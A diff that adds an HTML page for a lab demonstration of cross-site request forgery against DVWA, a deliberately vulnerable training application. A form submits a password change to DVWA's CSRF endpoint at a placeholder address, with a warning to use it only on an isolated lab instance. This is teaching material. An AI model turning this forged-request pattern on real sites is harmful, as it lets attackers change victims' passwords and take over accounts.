@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>DVWA CSRF Lab Demonstration</title>
+</head>
+<body>
+  <h1>Controlled DVWA CSRF Test</h1>
+  <p>Use only against your isolated DVWA instance while logged in at the vulnerable security level.</p>
+
+  <!-- Replace DVWA_IP with the private address of your isolated lab target. -->
+  <form action="http://DVWA_IP/dvwa/vulnerabilities/csrf/" method="get">
+    <label>
+      New password
+      <input type="password" name="password_new" required>
+    </label>
+    <br>
+    <label>
+      Confirm password
+      <input type="password" name="password_conf" required>
+    </label>
+    <br>
+    <button type="submit" name="Change" value="Change">Change</button>
+  </form>
+</body>
+</html>
